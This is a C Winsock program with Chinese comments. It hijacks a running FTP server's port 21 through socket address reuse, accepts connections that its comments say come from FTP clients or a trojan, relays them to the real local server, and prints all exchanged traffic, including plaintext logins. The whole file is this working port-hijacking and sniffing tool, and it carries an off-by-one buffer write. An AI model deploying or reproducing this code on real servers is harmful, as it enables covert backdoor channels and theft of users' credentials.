#include <stdio.h>
#include <winsock2.h>

#pragma comment (lib, "ws2_32")

DWORD WINAPI ClientThread(LPVOID lpParam);

int main()
{
    WSADATA wsa;
    SOCKET s;
    BOOL bVal;
    SOCKET sc;
    int nAddrSize;
    sockaddr_in ClientAddr;

    // 初始化SOCK库
    WSAStartup(MAKEWORD(2, 2), &wsa);

    // 建立套接字
    s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    
    bVal = TRUE;

    // 设置套接字为复用模式
    if ( setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (char *)&bVal, sizeof(bVal)) != 0 )
    {
        printf("error! \r\n");

        return -1;
    }
    

    sockaddr_in sListen;
    sListen.sin_family = AF_INET;
    // 这里的IP地址必须明确指定一个地址
    sListen.sin_addr.S_un.S_addr = inet_addr("192.168.1.102");
    sListen.sin_port = htons(21);

    // 绑定21号端口
    if ( bind(s, (SOCKADDR*)&sListen, sizeof(SOCKADDR)) == SOCKET_ERROR )
    {
        printf("%d\r\n", GetLastError());
        printf("error bind! \r\n");
        return -1;
    }

    // 监听套接字
    listen(s, 1);

    // 循环接受来自FTP客户端或木马的请求
    while ( TRUE )
    {
        HANDLE hThread;

        nAddrSize = sizeof(SOCKADDR);
        // 接受请求
        sc = accept(s, (SOCKADDR*)&ClientAddr, &nAddrSize);
        if ( sc != INVALID_SOCKET )
        {
            // 创建新线程进行处理
            hThread = CreateThread(NULL, 0, ClientThread, (LPVOID)sc, 0, NULL);
            CloseHandle(hThread);
        }
    }

    closesocket(s);
    WSACleanup();

    return 0;
}

DWORD WINAPI ClientThread(LPVOID lpParam)
{
    // 保存与FTP客户端通信的SOCKET
    SOCKET sc = (SOCKET)lpParam;
    // 建立与FTP服务器端通信的SOCKET
    SOCKET sFtp;
    sockaddr_in saddr;
    DWORD dwTimeOut;
    DWORD dwNum;
    BYTE bBuffer[0x1000] = { 0 };
    sFtp = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    
    saddr.sin_family = AF_INET;
    saddr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
    saddr.sin_port = htons(21);
    
    // 设置超时
    dwTimeOut = 100;
    setsockopt(sc, SOL_SOCKET, SO_RCVTIMEO, 
                (char *)&dwTimeOut, sizeof(dwTimeOut));
    setsockopt(sFtp, SOL_SOCKET, SO_RCVTIMEO, 
                (char *)&dwTimeOut, sizeof(dwTimeOut));

    // 连接FTP服务器
    connect(sFtp, (SOCKADDR*)&saddr, sizeof(SOCKADDR));

    // 循环接受客户端与服务器的通信数据
    while ( TRUE )
    {
        // 接收客户端的数据
        dwNum = recv(sc, (char *)bBuffer, 0x1000, 0);
        if ( dwNum > 0 && dwNum != SOCKET_ERROR )
        {
            bBuffer[dwNum] = '\0';
            printf("%s \r\n", bBuffer);
            // 转发给FTP服务器端
            send(sFtp, (char *)bBuffer, dwNum, 0);
        }
        else if ( dwNum == 0 )
        {
            break;
        }

        ZeroMemory(bBuffer, 0x1000);
        
        // 接收FTP服务器端的数据
        dwNum = recv(sFtp, (char *)bBuffer, 0x1000, 0);
        if ( dwNum > 0 && dwNum != SOCKET_ERROR )
        {
            bBuffer[dwNum] = '\0';
            printf("%s \r\n", bBuffer);
            // 转发给客户端
            send(sc, (char *)bBuffer, dwNum, 0);
        }
        else if ( dwNum == 0 )
        {
            break;
        }

        ZeroMemory(bBuffer, 0x1000);
    }

    closesocket(sc);
    closesocket(sFtp);

    return 0;
}